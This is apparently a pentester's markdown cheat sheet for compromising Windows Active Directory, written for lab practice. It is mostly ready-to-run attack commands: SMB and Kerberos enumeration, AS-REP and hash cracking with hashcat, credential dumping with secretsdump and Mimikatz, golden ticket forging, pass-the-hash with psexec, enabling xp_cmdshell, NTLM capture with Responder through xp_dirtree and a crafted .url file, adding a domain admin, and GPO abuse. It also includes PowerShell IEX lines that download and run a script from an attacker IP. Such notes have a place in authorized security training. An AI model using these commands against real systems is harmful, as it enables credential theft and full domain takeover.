# Active Directory
[Reference Video](https://www.youtube.com/watch?v=pdgBU9MDAwE&t=36188s)

[AD Mind Map](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Unique Methodology](https://youtu.be/aZsysS4BaTs)

[Unique Methodology #2](https://youtu.be/f8jGhLwCa28&t=1710s)

## Enumeration
Nmap:
```
nmap -A -p- -T5 -Pn <ip> -v
```
SMBMap:
```
smbmap -H <ip>
smbmap -u <username> -p <pass> -H <ip>
```

SMBClient:
```
smbclient //<ip>/<share name> -c 'recurse;ls'
smbclient -N -L <ip>
smbclient -N //<ip>/<share>
smbclient -U <username> -L <ip>
```

Evil-WinRM:
```
evil-winrm -i <ip> -u <username> -p '<password>'
```

impacket-GetNPUsers
```
impacket-GetNPUsers -dc-ip <ip> <domain>/<account-name> -no-pass
impacket-GetNPUsers -dc-ip <ip> <domain>/<account-name>:<pass>
```

impacket-secretsdump
```
impacket-secretsdump '<username>:<password@<ip>'
```

impacket-psexec
```
impacket-psexec <domain>/<username>@<ip>
impacket-psexec <username>@<ip> -hashes :<NT-hash>
```

impacket-wmiexec
```
impacket-wmiexec '<username>:<password>@<ip>'
```

impacket-mssqlclient
```
impacket-mssqlclient <username>:'<password>'@<ip> -windows-auth 
```

SQSH
```
sqsh -S <ip> U '<domain>/<username>' -P '<password>'
```
```
# Trying to get code execution on the MSSQL server
SELECT IS_SRVROLEMEMBER('sysadmin')
go
EXECUTE sp_configure 'show advanced options'
go
reconfigure
go
EXECUTE sp_configure 'xp_cmdshell', 1
go
reconfigure
go
xp_cmdshell 'whoami'
go
```


GPP-Decrypt:
```
gpp-decrypt <hash>
```


## Post Exploitation

Run ```whoami /all``` to get all the privileges of the current user.

Mimikatz
```
# Dump credentials
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```
```
# Golden ticket information - Dump SID and KRBTGT hash (on DC)
mimikatz # privilege::debug
mimikatz # token::elevate (DONT NEED THIS)
mimikatz # lsadump::lsa /patch
```

```
# Create golden ticket (write to file in this case)
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424454709-3473652537-2193885599 /krbtgt:4199649f577fc4f17791600916044e88 /ticket:golden
```

```
# Super golden ticket
kerberos::golden /user:<username> /domain:<domain> /sid:S-1-5-21-424564709-3573252527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:<ticket-name> /endin:2147483647
```

```
# Inject ticket to memory
mimikatz # kerberos::ptt golden
# PsExec to DC
PsExec64.exe <dc-name> cmd.exe
```

Net user/group
```
# Adding a domain admin
net user <username> <password> /add /domain
net group "domain admins" <username> /add /domain
```


PowerUp.ps1
```
powershell -c 'IEX(New-Object Net.WebClient).downloadString("http://<attacker-ip>:<attacker-port>/powerup.ps1")'
Invoke-AllChecks
```

WinPEAS

SharpHound/BloodHound

bloodhound-python


[oletools](https://github.com/decalage2/oletools) for extracing VBA scripts from xlsm files.
```
olevba file.xlsm
```

## Methodology
- If ports 139,445(SMB), 389(ldap) ,464 (kpasswd) are open so enumerating the services in this order (PhD Security's methodology)

- If anonymous access to ftp, smb is available check the FS, and try to get sensitive informations like GroupPolicies, password files, xml files etc.

- Credentials stored under group policies can be decrypted using ``gpp-decrypt``.
```
gpp-decrypt <hash>
``` 
- If we are able to retrieve any creds, try various login methods such as smb, ssh, winrm, wmic etc. this can be done using **crackmapexec**
```
crackmapexec <protocol> -U username -P password -H target
```
- We can also try an impacket tool name **GetNPUsers** to dump TGT from a service without having the password.
```
impacket-GetNPUsers -dc-ip <ip> <domain>/<account-name> -no-pass
```
- It might throw an error saying **Clock skew too great**, install ntpdate, and run sudo ntpdate <dc-ip>
- If we do get a ticket back, we can crack it using hashcat and get the password.
```
hashcat -m 13100 hash.txt rockyou.txt 
```
- Using this credentials to login into various services.

- We have credentials for a service account, we can use **impacket-secretsdump** to grab the NTDS.DIT file secrets.
```
impacket-secretsdump '<username>:<password@<ip>'
```
- Output of this command gives us the NTLM hash. With this hash, we can carry out the Pass-The-Hash attack. We can carry out this PTH attack using PsExec as follow.
```
impacket-psexec <domain>/<username>@<ip> -hashes <NT-hash>:<NT-hash>
```

- If we get access to a smb share with read/write perm, we can psexec into that machine.
```
impacket-psexec <domain>/<username>@<ip>
```
- If we have credentials and ms-sql port is open (port 1433), try using the impacket-mssqlclient.
```
impacket-mssqlclient <username>:'<password>'@<ip> -windows-auth 
```
- We the credentials are correct for the mssql, we can have command injection using xp_cmdshell.
```
enable_xp_cmdshell
xp_cmdshell whoami
```
- If this errors out, there is another way, i.e by running mssql client to connect to back to us by telling it to access a share that doesnt exist. So inorder to capture the NTLM hash we have to run responder on the VPN interface.

In the mssqlclient shell:
```
xp_dirtree "\\<our-ip>\<random-share-name>" 
```
In attacker machine:
```
responder -I tun0 
```
- Grab the NTLMv2 hash and crack it using hashcat
```
hashcat -m 5600 hash.txt rockyou.txt 
```
- Once inside a system, try using PowerUp.ps1 from [github](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) and execute it in the Powershell, and run Invoke-AllChecks.
```
powershell IEX(New-Object Net.WebClient).downloadString("http://attackerip:8000/powerup.ps1")
Invoke-AllChecks
```
- Check if it leaks any admin account creds.

- If we have **SeImpersonatePrivilege**, run JuicyPotato or RottenPotato attacks.

- If you find username with first name: last name combo in any service, try to enumerate for these users by the format first character of first name and last name, eg: fergus:smith -> fsmith.

- Always try finding credentials, default of stored credentials, enumerate the services with these creds and pivot. If we get exploit with no auth that comes first priority, else just enumerate services like ftp, http, smb for juicy informations.

## External Knowledge
- From S1RENS video on AD, where we can dump username and their NTLMv2 hash if we have upload permission on an smb server.
- Youtube: [Dumping Hash w/ Responder - Vault Walkthrough with S1REN - (PG-Practice) (Hack-A-Thon)](https://www.youtube.com/watch?v=JocbrhLXuss&t=3240s)
- This is carried out by crafting a url file, with the Contents:
```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<smb ip>\%USERNAME%.icon
IconIndex=1
```
- Run responder on the interface tun0
```
responder -I tun0 -v
```
- After that upload the filename.url file into the smb server, and see the output of the responder.

- Another key take away from the video is the use of Evil-WinRM if we are able to get any credentials of a user in the AD.
```
evil-winrm -i $IP -u $username -p $passwd
```
- After getting a shell onto the box, run the basic command ``whoami /priv`` which is equivalent to ``sudo -l`` in linux.
- Also run ``whoami /groups``
- Reference: [PrivEsc w/ SharpGPOAbuse - Vault Walkthrough with S1REN - (PG-Practice) (Hack-A-Thon)](https://www.youtube.com/watch?v=JocbrhLXuss&t=3995)
- If we see most of the Privilege is enabled we can use PowerView.
- For PrivEsc we use **powerview.ps1** inorder to get the Group Policy of the Domain  
```
Get-GPO -Name "Default Domain Policy"
```
- From that grab the SID number and check if the GpoStatus if **AllSettingsEnabled**
- Now use this data to Get the GPO permissions of a user.
```
Get-GPPermission -Guid $SID -TargetType User -TargetName $username
```
- Check the permissions from the output and if it is **GpoEditDeleteModifySecurity** we can abuse it using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

- Execute the executable on the victim machine
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $username --GPOName "Default Domain Policy"
```
- But if we check the net user on the username we wont have Admin privileges yet, for that we have to do ``gpupdate /force``
- Now if you check ``net user $username`` we can see we are **Administrator** in the box.
- Now PsExec into the box using the credentials of the username
```
PsExec.py $domain/$username:$password@$IP
```
- Run ``whoami``